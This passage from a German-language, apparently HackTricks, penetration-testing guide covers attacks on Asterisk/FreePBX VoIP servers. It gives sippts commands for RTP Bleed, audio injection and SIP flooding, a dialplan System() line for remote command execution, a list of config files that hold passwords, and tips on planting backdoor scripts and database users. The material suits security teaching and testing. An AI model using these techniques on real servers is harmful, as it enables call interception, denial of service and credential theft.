**RTCPBleed** ist ein schwerwiegendes Sicherheitsproblem, das Asterisk-basierte VoIP-Server betrifft (ver√∂ffentlicht im Jahr 2017). Die Sicherheitsanf√§lligkeit erm√∂glicht es, dass **RTP (Real Time Protocol)-Verkehr**, der VoIP-Gespr√§che √ºbertr√§gt, **von jedem im Internet abgefangen und umgeleitet werden kann**. Dies geschieht, weil RTP-Verkehr die Authentifizierung umgeht, wenn er durch NAT (Network Address Translation)-Firewalls navigiert.

RTP-Proxys versuchen, **NAT-Einschr√§nkungen** zu beheben, die RTC-Systeme betreffen, indem sie RTP-Streams zwischen zwei oder mehr Parteien proxyen. Wenn NAT vorhanden ist, kann die RTP-Proxy-Software oft nicht auf die RTP-IP- und Portinformationen zugreifen, die √ºber Signalisierung (z. B. SIP) abgerufen werden. Daher haben eine Reihe von RTP-Proxys einen Mechanismus implementiert, bei dem solche **IP- und Port-Tuple automatisch gelernt werden**. Dies geschieht oft, indem eingehender RTP-Verkehr inspiziert und die Quell-IP und der Port f√ºr jeden eingehenden RTP-Verkehr als derjenige markiert werden, auf den geantwortet werden sollte. Dieser Mechanismus, der als "Lernmodus" bezeichnet werden kann, **verwendet keine Art von Authentifizierung**. Daher k√∂nnen **Angreifer** **RTP-Verkehr an den RTP-Proxy senden** und den proxied RTP-Verkehr empfangen, der f√ºr den Anrufer oder den Angerufenen eines laufenden RTP-Streams bestimmt ist. Wir nennen diese Sicherheitsanf√§lligkeit RTP Bleed, weil sie es Angreifern erm√∂glicht, RTP-Medienstreams zu empfangen, die f√ºr legitime Benutzer bestimmt sind.

Ein weiteres interessantes Verhalten von RTP-Proxys und RTP-Stacks ist, dass sie manchmal, **selbst wenn sie nicht anf√§llig f√ºr RTP Bleed sind**, **RTP-Pakete von jeder Quelle akzeptieren, weiterleiten und/oder verarbeiten**. Daher k√∂nnen Angreifer RTP-Pakete senden, die es ihnen erm√∂glichen, ihre Medien anstelle der legitimen einzuf√ºgen. Wir nennen diesen Angriff RTP-Injection, weil er die Einspeisung illegitimer RTP-Pakete in bestehende RTP-Streams erm√∂glicht. Diese Sicherheitsanf√§lligkeit kann sowohl in RTP-Proxys als auch in Endpunkten gefunden werden.

Asterisk und FreePBX haben traditionell die **`NAT=yes`-Einstellung** verwendet, die es RTP-Verkehr erm√∂glicht, die Authentifizierung zu umgehen, was potenziell zu keinem Audio oder einseitigem Audio bei Anrufen f√ºhren kann.

F√ºr weitere Informationen siehe [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed erkennt die RTP Bleed-Sicherheitsanf√§lligkeit, indem es RTP-Streams sendet.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed erkennt die RTP Bleed-Sicherheitsanf√§lligkeit, indem RTCP-Streams gesendet werden.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood nutzt die RTP Bleed-Sicherheitsanf√§lligkeit aus, indem RTP-Streams gesendet werden.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject nutzt die RTP Bleed-Sicherheitsanf√§lligkeit aus, indem eine Audiodatei (WAV-Format) injiziert wird.
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

In Asterisk gelingt es Ihnen irgendwie, **Erweiterungsregeln hinzuzuf√ºgen und sie neu zu laden** (zum Beispiel durch das Kompromittieren eines anf√§lligen Web-Manager-Servers), es ist m√∂glich, RCE mit dem **`System`**-Befehl zu erhalten.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Es gibt einen Befehl namens **`Shell`**, der **anstatt von `System`** verwendet werden kann, um Systembefehle auszuf√ºhren, falls erforderlich.

{% hint style="warning" %}
Wenn der Server die Verwendung bestimmter Zeichen im **`System`**-Befehl (wie in Elastix) **nicht zul√§sst**, √ºberpr√ºfen Sie, ob der Webserver es erlaubt, **irgendwie Dateien im System zu erstellen** (wie in Elastix oder trixbox), und verwenden Sie dies, um ein **Backdoor-Skript** zu **erstellen** und dann **`System`** zu verwenden, um dieses **Skript** **auszuf√ºhren**.
{% endhint %}

#### Interessante lokale Dateien und Berechtigungen

* **`sip.conf`** -> Enth√§lt das Passwort der SIP-Benutzer.
* Wenn der **Asterisk-Server als root** ausgef√ºhrt wird, k√∂nnten Sie root kompromittieren.
* Der **mysql root-Benutzer** k√∂nnte **kein Passwort** haben.
* Dies k√∂nnte verwendet werden, um einen neuen mysql-Benutzer als Backdoor zu erstellen.
* **`FreePBX`**
* **`amportal.conf`** -> Enth√§lt das Passwort des Administrators des Webpanels (FreePBX).
* **`FreePBX.conf`** -> Enth√§lt das Passwort des Benutzers FreePBXuser, der auf die Datenbank zugreift.
* Dies k√∂nnte verwendet werden, um einen neuen mysql-Benutzer als Backdoor zu erstellen.
* **`Elastix`**
* **`Elastix.conf`** -> Enth√§lt mehrere Passw√∂rter im Klartext, wie mysql root-Passwort, IMAPd-Passwort, Web-Admin-Passwort.
* **Mehrere Ordner** geh√∂ren dem kompromittierten Asterisk-Benutzer (wenn nicht als root ausgef√ºhrt). Dieser Benutzer kann die vorherigen Dateien lesen und kontrolliert auch die Konfiguration, sodass er Asterisk dazu bringen k√∂nnte, andere kompromittierte Bin√§rdateien beim Ausf√ºhren zu laden.

### RTP-Injektion

Es ist m√∂glich, eine **`.wav`** in Gespr√§che einzuf√ºgen, indem man Tools wie **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) und **`rtpmixsound`** (`sudo apt install rtpmixsound`) verwendet.

Oder Sie k√∂nnten die Skripte von [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) verwenden, um **Gespr√§che zu scannen** (**`rtpscan.pl`**), eine `.wav` an ein Gespr√§ch zu senden (**`rtpsend.pl`**) und **Ger√§usche** in ein Gespr√§ch einzuf√ºgen (**`rtpflood.pl`**).

### DoS

Es gibt mehrere M√∂glichkeiten, um DoS in VoIP-Servern zu erreichen.

* **`SIPPTS flood`** von [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood sendet unbegrenzt Nachrichten an das Ziel.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** von [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping f√ºhrt einen SIP-Ping durch, um die Serverantwortzeit zu √ºberpr√ºfen.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS IAX-Protokoll, das von Asterisk verwendet wird.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Ein Tool, um SIP/SDP INVITE-Nachrichten √ºber UDP/IP zu fluten.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Sendet mehrere gut formatierte RTP-Pakete. Es ist notwendig, die verwendeten RTP-Ports zu kennen (zuerst sniffen).
* [**SIPp**](https://github.com/SIPp/sipp): Erm√∂glicht die Analyse und Generierung von SIP-Verkehr, sodass es auch f√ºr DoS verwendet werden kann.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP Schweizer Taschenmesser. Kann auch verwendet werden, um SIP-Angriffe durchzuf√ºhren.
* Fuzzer: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS-Schwachstellen

Der einfachste Weg, eine Software wie Asterisk zu installieren, besteht darin, eine **Betriebssystemverteilung** herunterzuladen, die bereits installiert ist, wie: **FreePBX, Elastix, Trixbox**... Das Problem dabei ist, dass, sobald es funktioniert, die Systemadministratoren **sie m√∂glicherweise nicht mehr aktualisieren** und **Schwachstellen** im Laufe der Zeit entdeckt werden.

## Referenzen

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
